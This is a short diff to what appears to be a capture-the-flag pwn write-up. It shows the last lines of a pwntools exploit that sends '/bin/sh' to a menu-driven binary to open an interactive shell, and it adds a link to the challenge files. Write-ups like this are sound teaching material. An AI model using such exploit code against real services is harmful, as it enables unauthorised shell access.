@@ -165,3 +165,5 @@ p.recvuntil("your choice>> ")
 p.sendline("/bin/sh\x00")
 p.interactive()
 ```
+### Related Link
+[相关文件](https://github.com/BBS-Bill-Gates/CTF/tree/master/2018/National/pwn/task)
